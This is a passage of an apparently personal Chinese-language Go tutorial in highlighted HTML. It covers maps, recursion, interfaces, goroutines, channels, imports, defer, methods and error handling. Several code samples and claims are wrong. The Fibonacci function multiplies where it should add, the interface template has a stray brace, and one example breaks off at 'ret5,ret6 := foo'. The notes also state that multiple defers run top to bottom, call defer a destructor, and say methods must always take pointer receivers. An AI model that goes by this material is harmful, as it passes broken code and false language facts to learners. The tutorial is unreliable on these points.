string">"Italy"</span><span class="token punctuation">:</span> <span class="token string">"Rome"</span><span class="token punctuation">,</span> <span class="token string">"Japan"</span><span class="token punctuation">:</span> <span class="token string">"Tokyo"</span><span class="token punctuation">,</span> <span class="token string">"India"</span><span class="token punctuation">:</span> <span class="token string">"New delhi"</span><span class="token punctuation">&#125;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"原始地图"</span><span class="token punctuation">)</span><span class="token keyword">for</span> country <span class="token operator">:=</span> <span class="token keyword">range</span> countryCapitalMap <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>country<span class="token punctuation">,</span><span class="token string">"首都是"</span><span class="token punctuation">,</span>countryCapitalMap<span class="token punctuation">[</span>country<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">delete</span><span class="token punctuation">(</span>countryCapitalMap<span class="token punctuation">,</span><span class="token string">"France"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> country <span class="token operator">:=</span> <span class="token keyword">range</span> countryCapitalMap <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>country<span class="token punctuation">,</span><span class="token string">"首都是"</span><span class="token punctuation">,</span>countryCapitalMap<span class="token punctuation">[</span>country<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="go语言递归"><a href="#go语言递归" class="headerlink" title="go语言递归"></a>go语言递归</h3><ol><li><p>递归，在运行的过程中调用自己</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">recursion</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">recursion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">recursion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">fib</span><span class="token punctuation">(</span>n <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">2</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> n<span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> i <span class="token builtin">int</span><span class="token keyword">for</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%d\t"</span><span class="token punctuation">,</span><span class="token function">fib</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//斐波那契数列</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="go语言类型转换"><a href="#go语言类型转换" class="headerlink" title="go语言类型转换"></a>go语言类型转换</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">type_name</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span><span class="token comment">//expression中填变量的名字</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> sum <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">17</span><span class="token keyword">var</span> count <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">var</span> mean <span class="token builtin">float32</span>mean <span class="token operator">=</span> <span class="token function">float32</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">float32</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"mean的值为 %f"</span><span class="token punctuation">,</span>mean<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  <strong>go不支持隐式类型转换</strong>，必须进行显示类型转换，否则会报错</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006211522.png"></li></ol><h2 id="go语言接口"><a href="#go语言接口" class="headerlink" title="go语言接口"></a>go语言接口</h2><ol><li><p>将所有具有共性的方法定义在一起，任何其它类型只要实现了这些（全部）方法就是实现了这个接口</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> interface_name <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>method_name1 <span class="token punctuation">[</span>return_type<span class="token punctuation">]</span>    method_name2 <span class="token punctuation">[</span>return_type<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>struct_name_variable struct_name<span class="token punctuation">)</span> <span class="token function">method_name1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>return_type<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span>    <span class="token comment">//方法实现</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">type</span> Phone <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> NokiaPhone <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>nokiaPhone NokiaPhone<span class="token punctuation">)</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> IPhone <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>iphone IPhone<span class="token punctuation">)</span> <span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"def"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> phone Phonephone <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>NokiaPhone<span class="token punctuation">)</span>phone<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span>phone <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>IPhone<span class="token punctuation">)</span>phone<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="go并发"><a href="#go并发" class="headerlink" title="go并发"></a>go并发</h2><ol><li><p>  go语言支持并发，只需要通过关键字go来开启goroutine即可</p></li><li><p>goroutine是轻量级线程，goroutine的调度是由golang运行时进行管理的</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> 函数名<span class="token punctuation">(</span>参数列表<span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  go允许使用go语句开启一个新的运行期线程，即goroutine,以一个不同的，新创建的goroutine来执行一个函数</p></li><li><p>同一个程序中所有的goroutine共享同一个地址空间</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">say</span><span class="token punctuation">(</span>s <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">for</span> i <span class="token operator">:=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span> <span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Millisecond<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">go</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//这个程序中输出的hello和world没有固定的顺序，因为是两个goroutine在执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="通道"><a href="#通道" class="headerlink" title="通道"></a>通道</h3><ol><li><p>  channel是用来传输数据的一个数据结构</p></li><li><p>  通道可以用于两个goroutine之间通过传递一个指定类型的值来同步运行和通讯</p></li><li><p>操作符 <strong>&lt;-</strong> 用于指定通道的方向，发送或接收，如果没有指定方向，则为双向通道</p>  <pre class="line-numbers language-none"><code class="language-none">ch &lt;- v &#x2F;&#x2F;把v发送到通道chv :&#x3D; &lt;- ch &#x2F;&#x2F;从ch接收数据，并把值赋给v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="通道的声明"><a href="#通道的声明" class="headerlink" title="通道的声明"></a>通道的声明</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token comment">//通道的声明使用chan关键字，在声明之前必须先创建</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>默认情况下，<strong>通道是不带缓冲区的</strong>，发送端发送数据，同时<strong>必须有接收端相应的接收数据</strong></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token keyword">func</span> <span class="token function">sum</span><span class="token punctuation">(</span>s <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">,</span>c <span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>sum <span class="token operator">:=</span> <span class="token number">0</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span>v <span class="token operator">:=</span> <span class="token keyword">range</span> s <span class="token punctuation">&#123;</span>sum <span class="token operator">+=</span> v<span class="token punctuation">&#125;</span>c <span class="token operator">&lt;-</span> sum <span class="token comment">//将sum发送到通道c</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>c <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token function">sum</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token function">sum</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>c<span class="token punctuation">)</span>x <span class="token punctuation">,</span> y <span class="token operator">:=</span> <span class="token operator">&lt;-</span>c<span class="token punctuation">,</span><span class="token operator">&lt;-</span>cfmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="通道缓冲区"><a href="#通道缓冲区" class="headerlink" title="通道缓冲区"></a>通道缓冲区</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">ch <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">chan</span> <span class="token builtin">int</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">//通道可以设置缓冲区，通过make的第二个参数指定缓冲区的大小</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>  带缓冲区的通道允许发送端的数据发送和接收端的数据获取处于异步状态，就是说发送端发送的数据可以放在缓冲区中，可以等待接收端去获取数据，而不是立刻需要接收端去获取数据</p></li><li><p>  不过由于缓冲区的大小是有限的，还是需要有接收端来接收数据，否则缓冲区一满，数据发送端就无法再发送数据了</p></li></ol><h2 id="const和iota"><a href="#const和iota" class="headerlink" title="const和iota"></a>const和iota</h2><ol><li><p>和定义变量类似，就是<strong>将定义变量时的var关键字替换为const关键字</strong></p>   <pre class="line-numbers language-none"><code class="language-none">package mainimport &quot;fmt&quot;func main() &#123;const length int &#x3D; 10fmt.Println(&quot;length &#x3D; &quot;,length)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="一个函数有多个返回值"><a href="#一个函数有多个返回值" class="headerlink" title="一个函数有多个返回值"></a>一个函数有多个返回值</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token string">"fmt"</span><span class="token comment">//返回多个返回值，匿名的</span><span class="token keyword">func</span> <span class="token function">foo</span><span class="token punctuation">(</span>a <span class="token builtin">string</span><span class="token punctuation">,</span>b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span> <span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"a="</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"b="</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token keyword">return</span> a<span class="token punctuation">,</span>b<span class="token punctuation">&#125;</span><span class="token comment">//返回多个返回值，有形参名称的</span><span class="token keyword">func</span> <span class="token function">foo3</span><span class="token punctuation">(</span>a <span class="token builtin">string</span><span class="token punctuation">,</span>b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>r1 <span class="token builtin">int</span><span class="token punctuation">,</span>r2 <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"-----foo3-----"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"a= "</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"b= "</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token comment">//给有名称的返回值变量赋值</span>r1 <span class="token operator">=</span> <span class="token number">1000</span>r2 <span class="token operator">=</span> <span class="token number">2000</span><span class="token keyword">return</span> r1<span class="token punctuation">,</span>r2<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">foo4</span><span class="token punctuation">(</span>a <span class="token builtin">string</span><span class="token punctuation">,</span>b <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>r1<span class="token punctuation">,</span>r2 <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"-----foo4------"</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"a= "</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"b= "</span><span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token comment">//给有名称的返回值变量赋值</span>r1<span class="token operator">=</span><span class="token number">1000</span>r2<span class="token operator">=</span><span class="token number">2000</span><span class="token keyword">return</span> r1<span class="token punctuation">,</span>r2<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>ret1 <span class="token punctuation">,</span>ret2 <span class="token operator">:=</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"ret1:"</span><span class="token punctuation">,</span>ret1<span class="token punctuation">,</span><span class="token string">"ret2:"</span><span class="token punctuation">,</span>ret2<span class="token punctuation">)</span>ret3 <span class="token punctuation">,</span> ret4 <span class="token operator">:=</span> <span class="token function">foo3</span><span class="token punctuation">(</span><span class="token string">"foo3"</span><span class="token punctuation">,</span><span class="token number">333</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"ret3 = "</span><span class="token punctuation">,</span>ret3<span class="token punctuation">,</span><span class="token string">"ret4 = "</span><span class="token punctuation">,</span>ret4<span class="token punctuation">)</span>ret5<span class="token punctuation">,</span>ret6 <span class="token operator">:=</span> foo<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="导包的路径问题和init方法调用"><a href="#导包的路径问题和init方法调用" class="headerlink" title="导包的路径问题和init方法调用"></a>导包的路径问题和init方法调用</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008100203.png"></p><h2 id="import匿名及别名导包方式"><a href="#import匿名及别名导包方式" class="headerlink" title="import匿名及别名导包方式"></a>import匿名及别名导包方式</h2><h3 id="匿名导包"><a href="#匿名导包" class="headerlink" title="匿名导包"></a>匿名导包</h3><ol><li><p>  想<strong>调用这个包的init()函数</strong>，但是<strong>不想使用这个包的接口的需求</strong></p></li><li><p>  这种需求就可以使用匿名导入方式**(这种方法类似于起别名)**</p></li><li><p>就可以在<strong>导入的包的前面加上下划线，空格</strong></p>  <pre class="line-numbers language-none"><code class="language-none">import _ &quot;GolangStudy&#x2F;S-init&#x2F;lib1&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <strong>此时无法使用当前包的方法，但是会执行当前包内部的init方法</strong></p></li></ol><h3 id="别名导包"><a href="#别名导包" class="headerlink" title="别名导包"></a>别名导包</h3><ol><li><p>在包的名字前面加上包的别名，即可使用别名，不使用包原来的名字</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">mylib2 <span class="token string">"GolangStudy/S-init/lib2"</span><span class="token comment">//在main函数中可以使用别名进行调用</span>mylib2<span class="token punctuation">.</span><span class="token function">Lib2Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>在包的名字前面加上点，空格，就可以不使用包的名字，直接使用包内部的函数</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token punctuation">.</span> <span class="token string">"GolangStudy/S-init/lib2"</span><span class="token function">Lib2Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  这种点的导入方式尽量不要使用，可能会有同名函数起冲突</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008103242.png"></p></li></ol><h2 id="go语言的析构函数"><a href="#go语言的析构函数" class="headerlink" title="go语言的析构函数"></a>go语言的析构函数</h2><ol><li><p>go语言的析构函数关键字是defer</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">defer</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"一个函数体中允许有多个析构函数，调用顺序是从上到下"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//这样会在函数体的结束调用这个析构函数</span><span class="token keyword">defer</span> fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  在函数的前面添加defer关键字即为析构函数</p></li></ol><h3 id="defer和return的调用先后问题"><a href="#defer和return的调用先后问题" class="headerlink" title="defer和return的调用先后问题"></a>defer和return的调用先后问题</h3><ol><li>  defer是当前函数的生命周期全部结束之后才会被调用，才会出栈</li><li>  调用顺序是先调用return,在函数的生命周期结束之后才会调用defer</li><li>  书写顺序是先书写defer，然后再书写return,类似于c++</li></ol><h2 id="给一个结构体绑定方法"><a href="#给一个结构体绑定方法" class="headerlink" title="给一个结构体绑定方法"></a>给一个结构体绑定方法</h2><ol><li><p>给一个结构体绑定方法，一定要用指针</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>this <span class="token operator">*</span>Hero<span class="token punctuation">)</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221008171748.png"></p></li></ol><h2 id="go语言方法"><a href="#go语言方法" class="headerlink" title="go语言方法"></a>go语言方法</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015100204.png"></p><ol><li><p>方法是<strong>作用在指定的数据类型上</strong>的，<strong>和指定的数据类型绑定</strong>，因此<strong>自定义类型都可以拥有方法</strong></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> A <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Num <span class="token builtin">int</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>a A<span class="token punctuation">)</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//中间的(a A)表示这个方法是绑定到A结构体上的，类似于成员方法（A这个类的成员方法）</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>Num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>这个方法是和某个对象绑定的，所以通过某个对象来调用</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">type</span> Person <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>Name <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>p Person<span class="token punctuation">)</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//这个方法是绑定到Person类的</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"test() name=%s"</span><span class="token punctuation">,</span>p<span class="token punctuation">.</span>Name<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> p Personp<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"tom"</span>    p<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//所以要通过Person类的实例进行调用,不能直接test()直接调用，也不能使用其它类型的变量来调用</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  func (p Person) test(){} …p表示哪个Person变量调用，这个p就是它的副本，这点和函数传参（引用）非常相似</p></li><li><p>  p这个名字，由程序员指定，不是固定</p></li></ol><h2 id="go语言错误处理"><a href="#go语言错误处理" class="headerlink" title="go语言错误处理"></a>go语言错误处理</h2><ol><li><p>  通过内置的错误接口提供了简单的错误处理机制</p></li><li><p>error类型是一个接口类型</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> <span class="token builtin">error</span> <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">string</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  